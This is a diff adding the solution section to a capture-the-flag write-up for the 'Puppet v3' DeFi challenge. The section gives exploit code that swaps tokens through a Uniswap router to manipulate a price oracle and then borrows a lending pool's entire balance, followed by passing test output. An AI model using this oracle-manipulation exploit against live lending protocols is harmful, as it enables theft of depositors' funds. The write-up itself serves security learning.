@@ -111,6 +111,52 @@ NOTE: unlike others, this challenge requires you to set a valid RPC URL in the c
 
 # Subverting
 
+Here are the attacker commands:
+
+```shell
+yarn add @uniswap/swap-router-contracts
+```
+
+```js
+const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
+```
+
+Here are the attacker commands:
+
+```js
+const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
+await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+await uniswapRouter.exactInputSingle(
+    [token.address,
+    weth.address,   
+    3000,
+    player.address,
+    PLAYER_INITIAL_TOKEN_BALANCE,
+    0,
+    0],
+    {
+gasLimit: 1e7
+    }
+);
+await time.increase(100);
+await weth.connect(player).approve(lendingPool.address, await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
+await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+```
+
+Solve the challenge.
+
+```powershell
 
 
+  [Challenge] Puppet v3
+    ✔ Execution (1775ms)
+
+
+  1 passing (7s)
+
+Done in 8.07s.
+```
+
+**_by wasny0ps_**
 
